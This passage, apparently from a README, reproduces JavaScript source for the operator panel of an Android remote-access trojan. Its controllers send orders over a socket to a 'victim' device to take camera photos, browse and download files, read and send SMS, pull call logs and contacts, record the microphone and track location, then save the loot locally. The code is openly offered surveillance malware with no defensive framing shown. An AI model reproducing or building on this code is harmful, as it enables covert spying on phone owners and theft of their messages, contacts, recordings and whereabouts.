                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $camCtrl.imgUrl = 'data:image/png;base64,' + base64String;
            $camCtrl.isSaveShown = true;
            $camCtrl.$apply();

            $camCtrl.savePhoto = () => {
                $rootScope.Log('[i] Saving picture...', CONSTANTS.logStatus.INFO);
                var picPath = path.join(downloadsPath, Date.now() + ".jpg");
                fs.outputFile(picPath, new Buffer(base64String, "base64"), (err) => {
                    if (!err)
                        $rootScope.Log('[✓] Picture saved on ' + picPath, CONSTANTS.logStatus.SUCCESS);
                    else
                        $rootScope.Log('[x] Saving picture failed', CONSTANTS.logStatus.FAIL);

                });

            }

        }
    });

    $camCtrl.snap = () => {
        // send snap request to victim
        $rootScope.Log('[i] Snapping a picture...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: camera, extra: $camCtrl.selectedCam.id });
    }

});

//-----------------------File Manager Controller (fileManager.html)------------------------
app.controller("FmCtrl", function ($scope, $rootScope) {
    $fmCtrl = $scope;
    $fmCtrl.load = ''; // Initialize with an empty string
    $fmCtrl.files = [];
    $fmCtrl.externalRequestInProgress = false;
    $fmCtrl.sdCardRequestInProgress = false;

    $('.menu .item').tab();

    var fileManager = CONSTANTS.orders.fileManager;
    var externalStoragePathRequest = CONSTANTS.orders.externalStoragePathRequest;
    var sdCardPathRequest = CONSTANTS.orders.sdCardPathRequest;

    // Remove socket listeners on destroy
    $fmCtrl.$on('$destroy', () => {
        socket.removeAllListeners(fileManager);
        socket.removeAllListeners(externalStoragePathRequest);
        socket.removeAllListeners(sdCardPathRequest);
    });

    $fmCtrl.activateDefaultStorageTab = () => {
        $('.menu .item[data-tab="external"]').tab('change tab', 'external');
    }

    // Automatically activate external storage tab and request path
    angular.element(document).ready(function () {
        $fmCtrl.activateDefaultStorageTab();
        $fmCtrl.requestExternalStoragePath();
    });

    // Limit for infinite scrolling
    $fmCtrl.barLimit = 30;
    $fmCtrl.increaseLimit = () => {
        $fmCtrl.barLimit += 30;
    };

    // Request external storage path
    $fmCtrl.requestExternalStoragePath = () => {
        if (!$fmCtrl.externalRequestInProgress) {
            $fmCtrl.externalRequestInProgress = true;
            $fmCtrl.load = 'loading'; // Set to loading when requesting
            $rootScope.Log('Requesting external storage path...');
            socket.emit(ORDER, {
                order: externalStoragePathRequest
            });
        }
    };

    // Handle response for external storage
    socket.on(externalStoragePathRequest, (data) => {
        $fmCtrl.externalRequestInProgress = false;
        var externalStoragePath = data.path;
        if (externalStoragePath) {
            $rootScope.Log('Received external storage path: ' + externalStoragePath);
            socket.emit(ORDER, {
                order: fileManager,
                extra: 'ls',
                path: externalStoragePath
            });
        } else {
            $rootScope.Log('Failed to get external storage path!', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }
    });

    // Request SD card path
    $fmCtrl.requestSdCardPath = () => {
        if (!$fmCtrl.sdCardRequestInProgress) {
            $fmCtrl.sdCardRequestInProgress = true;
            $fmCtrl.load = 'loading'; // Set to loading when requesting
            $rootScope.Log('Requesting Removable Storage (SD Card) Path...');
            socket.emit(ORDER, {
                order: sdCardPathRequest
            });
        }
    };

    // Handle response for SD card
    socket.on(sdCardPathRequest, (data) => {
        $fmCtrl.sdCardRequestInProgress = false;
        var sdCardStoragePath = data.path;
        if (sdCardStoragePath) {
            $rootScope.Log('Received SD Card path: ' + sdCardStoragePath);
            socket.emit(ORDER, {
                order: fileManager,
                extra: 'ls',
                path: sdCardStoragePath
            });
        } else {
            $rootScope.Log('Failed to get SD Card path!', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }
    });

    // Handle file responses
    socket.on(fileManager, (data) => {
        if (data.file == true) {
            $rootScope.Log('Saving file..');
            var filePath = path.join(downloadsPath, data.name);
            fs.outputFile(filePath, data.buffer, (err) => {
                if (err)
                    $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                else
                    $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
            });
        } else if (data.length != 0) {
            $rootScope.Log('Files list arrived', CONSTANTS.logStatus.SUCCESS);
            $fmCtrl.load = '';
            $fmCtrl.files = data;
            $fmCtrl.$apply();
        } else {
            $rootScope.Log('That directory is inaccessible (Access denied)', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }
    });

    // Get files in directory
    $fmCtrl.getFiles = (file) => {
        if (file != null) {
            $fmCtrl.load = 'loading'; // Set to loading when fetching files
            $rootScope.Log('Get ' + file);
            socket.emit(ORDER, {
                order: fileManager,
                extra: 'ls',
                path: '/' + file
            });
        }
    };

    // Save file
    $fmCtrl.saveFile = (file) => {
        $rootScope.Log('Downloading ' + '/' + file);
        socket.emit(ORDER, {
            order: fileManager,
            extra: 'dl',
            path: '/' + file
        });
    };
});

//-----------------------SMS Controller (sms.html)------------------------
// SMS controller
app.controller("SMSCtrl", function ($scope, $rootScope) {
    $SMSCtrl = $scope;
    var sms = CONSTANTS.orders.sms;
    $SMSCtrl.inboxSMSList = [];
    $SMSCtrl.sentSMSList = [];
    $('.menu .item')
        .tab();

    $SMSCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(sms);
    });

    // sets and activates the nested inbox SMS list tab when the main `SMS Lists` tab is clicked
    $SMSCtrl.activateDefaultTabSmsLists = () => {
        // Use jQuery to activate the Inbox tab
        $('.menu .item[data-tab="inboxSMSList"]').tab('change tab', 'inboxSMSList');
    };    

    // send request to victim to bring all inbox sms
    $SMSCtrl.getInboxSMSList = () => {
        $SMSCtrl.load = 'loading';
        $SMSCtrl.inboxBarLimit = 50;
        $rootScope.Log("[i] Accessing the Victim's Inbox SMS's..", CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: sms, extra: 'inbox' });
    }

    // send request to victim to bring all sent sms
    $SMSCtrl.getSentSMSList = () => {
        $SMSCtrl.load = 'loading';
        $SMSCtrl.sentBarLimit = 50;
        $rootScope.Log("[i] Accessing the Victim's Outbox SMS's..", CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: sms, extra: 'outbox' });
    }

    $SMSCtrl.increaseLimit = (listType) => {
        if (listType === 'inbox') {
            $SMSCtrl.inboxBarLimit += 50;
        } else if (listType === 'outbox') {
            $SMSCtrl.sentBarLimit += 50;
        } else {
            $rootScope.Log('Unknown SMS List type:', listType);
        }
    }

    // send request to victim to send sms
    $SMSCtrl.SendSMS = (phoneNo, msg) => {
        if (!phoneNo && !msg) {
            $rootScope.Log("[x] Both the Phone Number Field and the Message Field are Empty!\n", CONSTANTS.logStatus.FAIL);
            $rootScope.Log("[i] Please Input a Phone Number and Text Message to Send.", CONSTANTS.logStatus.INFO);
            return;
        }
        if (!phoneNo) {
            $rootScope.Log('[x] The Phone Number Field is Empty!\n', CONSTANTS.logStatus.FAIL);
            $rootScope.Log("[i] Please Input a Phone Number.", CONSTANTS.logStatus.INFO);
            return;
        }
        if (!msg) {
            $rootScope.Log('[x] Message Field is Empty!', CONSTANTS.logStatus.FAIL);
            $rootScope.Log("[i] Please Input a Text Message to Send.", CONSTANTS.logStatus.INFO);
            return;
        }
        $rootScope.Log('[i] Sending SMS..', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
    }

    // save sms list to csv file
    $SMSCtrl.SaveInboxSMS = () => {
        if ($SMSCtrl.receivedList.length == 0) return;

        var inboxCsvRows = [];
        for (var i = 0; i < $SMSCtrl.receivedList.length; i++) {
            inboxCsvRows.push($SMSCtrl.receivedList[i].phoneNo + "," + $SMSCtrl.receivedList[i].msg);
        }

        var csvStr = inboxCsvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("[i] Saving the Victim's Inbox SMS List...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("[x] Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("[✓] Inbox SMS List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
        });
    }

    // save sms list to csv file
    $SMSCtrl.SaveSentSMS = () => {
        if ($SMSCtrl.sentList.length == 0) return;

        var sentCsvRows = [];
        for (var i = 0; i < $SMSCtrl.sentList.length; i++) {
            sentCsvRows.push($SMSCtrl.sentList[i].phoneNo + "," + $SMSCtrl.sentList[i].msg);
        }

        var csvStr = sentCsvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("[i] Saving the Victim's Outbox SMS List...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("[x] Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("[✓] Outbox SMS List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
        });
    }

    // listening for victim response
    socket.on(sms, (data) => {
        if (data.inboxSMSList) {
            $SMSCtrl.load = '';
            $rootScope.Log("[✓] The List of the Victim's Inbox SMS's has arrived.", CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.receivedList = data.inboxSMSList;
            $SMSCtrl.smsSize = data.inboxSMSList.length;
            $SMSCtrl.$apply();
        } else if (data.sentSMSList) {
            $SMSCtrl.load = '';
            $rootScope.Log("[✓] The List of the Victim's Outbox SMS's has arrived.", CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.sentList = data.sentSMSList;
            $SMSCtrl.smsSize = data.sentSMSList.length;
            $SMSCtrl.$apply();
        } else if (data) {
            $rootScope.Log('[✓] SMS sent.', CONSTANTS.logStatus.SUCCESS);
        } else {
            if (data.inboxSMSList === null) {
                $rootScope.Log("[x] Unable to Retrieve the Victim's Inbox SMS's!", CONSTANTS.logStatus.FAIL);
            } else if (data.sentSMSList === null) {
                $rootScope.Log("[x] Unable to Retrieve the Victim's Outbox SMS's!", CONSTANTS.logStatus.FAIL);
            } else if (data === null) {
                $rootScope.Log('[x] SMS Failed to Send!', CONSTANTS.logStatus.FAIL);
            } else {
                $rootScope.Log('[x] An unknown error occurred!', CONSTANTS.logStatus.FAIL);
            }
        }
    });    
});

//-----------------------Calls Controller (callslogs.html)------------------------
// Calls controller
app.controller("CallsCtrl", function ($scope, $rootScope) {
    $CallsCtrl = $scope;
    $CallsCtrl.callsList = [];
    var calls = CONSTANTS.orders.calls;

    $CallsCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(calls);
    });

    $CallsCtrl.load = 'loading';
    $rootScope.Log("[i] Accessing the Victim's Call Log...", CONSTANTS.logStatus.INFO);
    socket.emit(ORDER, { order: calls });


    $CallsCtrl.barLimit = 50;
    $CallsCtrl.increaseLimit = () => {
        $CallsCtrl.barLimit += 50;
    }


    $CallsCtrl.SaveCalls = () => {
        if ($CallsCtrl.callsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $CallsCtrl.callsList.length; i++) {
            var type = (($CallsCtrl.callsList[i].type) == 1 ? "INCOMING" : "OUTGOING");
            var name = (($CallsCtrl.callsList[i].name) == null ? "Unknown" : $CallsCtrl.callsList[i].name);
            csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Calls_" + Date.now() + ".csv");
        $rootScope.Log("[i] Saving Calls List...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("[x] Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("[✓] Calls List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(calls, (data) => {
        if (data.callsList) {
            $CallsCtrl.load = '';
            $rootScope.Log('[✓] Calls list arrived', CONSTANTS.logStatus.SUCCESS);
            $CallsCtrl.callsList = data.callsList;
            $CallsCtrl.logsSize = data.callsList.length;
            $CallsCtrl.$apply();
        }
    });

});

//-----------------------Contacts Controller (contacts.html)------------------------
// Contacts controller
app.controller("ContCtrl", function ($scope, $rootScope) {
    $ContCtrl = $scope;
    $ContCtrl.contactsList = [];
    var contacts = CONSTANTS.orders.contacts;

    $ContCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(contacts);
    });

    $ContCtrl.load = 'loading';
    $rootScope.Log("[i] Accessing the Victim's Contacts list...", CONSTANTS.logStatus.INFO);
    socket.emit(ORDER, { order: contacts });

    $ContCtrl.barLimit = 50;
    $ContCtrl.increaseLimit = () => {
        $ContCtrl.barLimit += 50;
    }

    $ContCtrl.SaveContacts = () => {

        if ($ContCtrl.contactsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $ContCtrl.contactsList.length; i++) {
            csvRows.push($ContCtrl.contactsList[i].phoneNo + "," + $ContCtrl.contactsList[i].name);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
        $rootScope.Log("[i] Saving Contacts List...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("[x] Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("[✓] Contacts List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
        });

    }

    socket.on(contacts, (data) => {
        if (data.contactsList) {
            $ContCtrl.load = '';
            $rootScope.Log('[✓] Contacts list arrived', CONSTANTS.logStatus.SUCCESS);
            $ContCtrl.contactsList = data.contactsList;
            $ContCtrl.contactsSize = data.contactsList.length;
            $ContCtrl.$apply();
        }
    });

});

//-----------------------Mic Controller (mic.html)------------------------
// Mic controller
app.controller("MicCtrl", function ($scope, $rootScope) {
    $MicCtrl = $scope;
    $MicCtrl.isAudio = true;
    var mic = CONSTANTS.orders.mic;

    $MicCtrl.$on('$destroy', function () {
        // release resources, cancel Listner...
        socket.removeAllListeners(mic);
    });

    $MicCtrl.Record = (seconds) => {

        if (seconds) {
            if (seconds > 0) {
                $rootScope.Log('[i] Recording ' + seconds + "'s...", CONSTANTS.logStatus.INFO);
                socket.emit(ORDER, { order: mic, sec: seconds });
            } else
                $rootScope.Log('[x] Seconds must be more than 0', CONSTANTS.logStatus.FAIL);

        }

    }

    socket.on(mic, (data) => {
        if (data.file == true) {
            $rootScope.Log('[✓] Audio arrived', CONSTANTS.logStatus.SUCCESS);

            var player = document.getElementById('player');
            var sourceMp3 = document.getElementById('sourceMp3');
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $MicCtrl.isAudio = false;
            $MicCtrl.$apply();
            sourceMp3.src = "data:audio/mp3;base64," + base64String;
            player.load();
            player.play();

            $MicCtrl.SaveAudio = () => {
                $rootScope.Log('[i] Saving file...', CONSTANTS.logStatus.INFO);
                var filePath = path.join(downloadsPath, data.name);
                fs.outputFile(filePath, data.buffer, (err) => {
                    if (err)
                        $rootScope.Log('[x] Saving file failed', CONSTANTS.logStatus.FAIL);
                    else
                        $rootScope.Log('[✓] File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
                });

            };

        }

    });
});

//-----------------------Location Controller (location.html)------------------------
// Location controller
app.controller("LocCtrl", function ($scope, $rootScope) {
    $LocCtrl = $scope;
    var location = CONSTANTS.orders.location;

    $LocCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(location);
    });

    var map = L.map('mapid').setView([51.505, -0.09], 13);
    L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);

    $LocCtrl.Refresh = () => {

        $LocCtrl.load = 'loading';
        $rootScope.Log("[i] Accessing the Victim's Location...", CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: location });

    }

    $LocCtrl.load = 'loading';
    $rootScope.Log("[i] Accessing the Victim's Location...", CONSTANTS.logStatus.INFO);
    socket.emit(ORDER, { order: location });

    var marker;
    socket.on(location, (data) => {
        $LocCtrl.load = '';
        if (data.enable) {
            if (data.lat == 0 && data.lng == 0)
                $rootScope.Log('[x] Try Refreshing.', CONSTANTS.logStatus.FAIL);
            else {
                $rootScope.Log("[✓] The Victim's Location has Arrived => " + data.lat + "," + data.lng, CONSTANTS.logStatus.SUCCESS);
                var victimLoc = new L.LatLng(data.lat, data.lng);
                if (!marker)
                    var marker = L.marker(victimLoc).addTo(map);
                else
                    marker.setLatLng(victimLoc).update();

                map.panTo(victimLoc);
            }
        } else
            $rootScope.Log("[x] The Location Service is not enabled on Victim's Device", CONSTANTS.logStatus.FAIL);
    });

});
```
<br>

- Notification Render Process (NotifiCtrl.js)
```js
const { ipcRenderer } = require('electron');
const { getCurrentWebContents } = require('@electron/remote');
const app = angular.module('myappy', []);

const victim = getCurrentWebContents().victim;

app.controller("NotifiCtrl", function($scope, $location) {
    $NotifiCtrl = $scope;
    $NotifiCtrl.victimSocket = victim.ip + ":" + victim.port;
    $NotifiCtrl.victimModel = victim.model;
    $NotifiCtrl.victimCountry = victim.country;
});
```

</div>
</details>
</div>

</details>
